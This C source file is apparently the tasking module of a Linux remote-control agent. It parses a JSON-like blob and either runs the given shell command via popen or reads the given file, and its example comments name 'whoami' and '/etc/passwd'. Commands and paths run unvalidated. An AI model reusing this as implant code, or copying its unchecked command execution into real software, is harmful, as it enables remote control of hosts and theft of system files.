// linux-agent/src/tasks_linux.c
#include "tasks_linux.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Execute a shell command, capture output
int task_shell_exec(const char* cmd, char** output, size_t* output_len) {
    FILE* fp = popen(cmd, "r");
    if (!fp) {
        printf("[!] task_shell_exec: popen failed\n");
        return -1;
    }

    size_t buf_size = 4096;
    char* buf = malloc(buf_size);
    if (!buf) { pclose(fp); return -1; }

    size_t total = 0;
    char chunk[512];
    while (fgets(chunk, sizeof(chunk), fp)) {
        size_t chunk_len = strlen(chunk);
        if (total + chunk_len >= buf_size) {
            buf_size *= 2;
            char* tmp = realloc(buf, buf_size);
            if (!tmp) { free(buf); pclose(fp); return -1; }
            buf = tmp;
        }
        memcpy(buf + total, chunk, chunk_len);
        total += chunk_len;
    }
    buf[total] = '\0';
    pclose(fp);

    *output = buf;
    *output_len = total;
    printf("[+] task_shell_exec: %zu bytes output\n", total);
    return 0;
}

// Read a file into memory
int task_file_read(const char* path, char** output, size_t* output_len) {
    FILE* fp = fopen(path, "rb");
    if (!fp) {
        printf("[!] task_file_read: cannot open %s\n", path);
        return -1;
    }

    fseek(fp, 0, SEEK_END);
    long fsize = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    char* buf = malloc(fsize + 1);
    if (!buf) { fclose(fp); return -1; }

    fread(buf, 1, fsize, fp);
    buf[fsize] = '\0';
    fclose(fp);

    *output = buf;
    *output_len = (size_t)fsize;
    printf("[+] task_file_read: %ld bytes from %s\n", fsize, path);
    return 0;
}

// Simple task dispatcher — parses JSON-like task blob
// Expected format: {"type":"shell_exec","cmd":"whoami"}
//                  {"type":"file_read","path":"/etc/passwd"}
void dispatch_task_linux(const unsigned char* data, size_t len) {
    if (!data || len == 0) return;

    // Simple string search for task type
    char* str = malloc(len + 1);
    if (!str) return;
    memcpy(str, data, len);
    str[len] = '\0';

    printf("[*] dispatch_task_linux: %s\n", str);

    if (strstr(str, "shell_exec")) {
        // Extract command value
        char* cmd_start = strstr(str, "\"cmd\":\"");
        if (cmd_start) {
            cmd_start += 7; // skip "cmd":"
            char* cmd_end = strchr(cmd_start, '"');
            if (cmd_end) {
                *cmd_end = '\0';
                char* output = NULL;
                size_t output_len = 0;
                task_shell_exec(cmd_start, &output, &output_len);
                if (output) {
                    printf("[*] Output: %s\n", output);
                    free(output);
                }
            }
        }
    } else if (strstr(str, "file_read")) {
        char* path_start = strstr(str, "\"path\":\"");
        if (path_start) {
            path_start += 8;
            char* path_end = strchr(path_start, '"');
            if (path_end) {
                *path_end = '\0';
                char* output = NULL;
                size_t output_len = 0;
                task_file_read(path_start, &output, &output_len);
                if (output) free(output);
            }
        }
    }

    free(str);
}
